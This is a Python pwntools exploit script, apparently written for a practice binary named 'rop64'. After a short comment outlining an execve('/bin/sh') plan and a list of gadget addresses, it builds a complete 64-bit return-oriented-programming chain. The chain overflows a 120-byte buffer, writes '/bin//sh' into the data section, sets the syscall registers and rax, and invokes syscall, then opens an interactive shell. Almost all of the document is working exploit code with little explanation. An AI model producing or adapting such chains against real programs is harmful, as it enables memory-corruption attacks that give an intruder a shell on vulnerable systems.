from pwn import *
context.arch = "amd64"
from struct import pack
io = process("./rop64")
'''
1. execve("/bin/sh",0,0)
2. arch  64bit / 32bit
3. if 64 bit:  1) execve => 59 : rax = 59
4.           rdi=> arg1 , rsi => arg2 ,rdx => arg3 
  execve("/bin/sh",0,0)   =>     arg1=bin_sh_addr,arg2=0,arg3=0
  arg1 => rdi => bin_sh_addr  
  arg2 => rsi => 0
  arg3 => rdx => 0

'''
# 0x0000000000401607 : pop rsi ; ret
# 0x00000000004787c6 : pop rax ; pop rdx ; pop rbx ; ret
# 0x00000000004673f5 : syscall ; ret
# 0x00000000004014e6 : pop rdi ; ret
sh = 0x4a12e4       # gdb-peda$ find /bin/sh
pop_rdi = 0x4014e6  # gdb-peda$ rop --grep "pop rdi"
pop_rax_rdx_rbx_ret = 0x4787c6 
syscall = 0x4673f5      # gdb-peda$ rop --grep "syscall"
pop_rsi = 0x401607  # 

#payload = flat(["A"*120,pop_rdi,sh,pop_rax_rdx_rbx_ret,59,0,1,pop_rsi,0,syscall])
p = 'a'*120
p += pack('<Q', 0x0000000000401607) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x00000000004bc7b0) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000474271) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401607) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004261ef) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474271) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004014e6) # pop rdi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x0000000000401607) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x0000000000442a26) # pop rdx ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004261ef) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004668b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673f5) # syscall ; ret

io.sendline(p)
io.interactive()
